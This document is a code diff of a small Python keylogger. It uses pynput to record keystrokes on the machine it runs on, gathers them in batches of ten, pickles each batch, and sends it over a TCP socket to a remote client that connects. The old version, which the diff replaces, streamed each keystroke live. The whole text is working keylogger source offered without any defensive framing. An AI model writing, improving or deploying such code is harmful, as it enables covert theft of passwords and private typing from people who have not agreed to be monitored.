@@ -1,9 +1,16 @@
 from pynput.keyboard import Listener
 import socket
+from pickle import dumps
 
+socket.setdefaulttimeout(2)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind(("192.168.178.22", 1236))
-s.listen()
+s.bind((socket.gethostname(), 1251))
+
+
+class Safe:
+    array = []
+    index = 0
+    multi = 1
 
 
 def update_array(char):
@@ -11,36 +18,34 @@ def update_array(char):
     Safe.index += 1
 
 
-class Safe:
-    array = []
-    index = 0
-
-
 def key_press(key):
     string_key = str(key).replace("'", "")
-    if "esc" in string_key:
-        client_socket.close()
-        return 0
-    client_socket.send(bytes(string_key, "utf-8"))
-
-    """with open(r"wsad.txt", "a")as f:
-        try:
-            f.write("{0}".format(key.char))
-            update_array(string_key)
-        except AttributeError:
-            if "Key.space" in str(key):
-                f.write(" ")
-                update_array(" ")
-            elif"key.enter" in str(key):
-                f.write("\n")
-                update_array("\n")
-            elif"Key.backspace" in str(key):
-                f.write("\nbackspace\n")
-                del Safe.array[-1]
-    print(Safe.array)"""
+    update_array(string_key)
+    if len(Safe.array) == 10:
+        return False
 
 
-client_socket, address = s.accept()
-print(f"Connection from {address} has been established")
-with Listener(on_press=key_press)as l:
-    l.join()
+while True:
+    try:
+        if not Safe.array:
+            with Listener(on_press=key_press)as l:
+                l.join()
+            Safe.multi += 1
+        else:
+            s.listen(1)
+            client_socket, address = s.accept()
+            print(f"connection to {address} has been established")
+            msg = dumps(Safe.array)
+            client_socket.send(msg)
+            Safe.array = []
+            Safe.index = 0
+            Safe.multi = 1
+    except socket.timeout:
+        continue
+
+
+
+
+
+
+
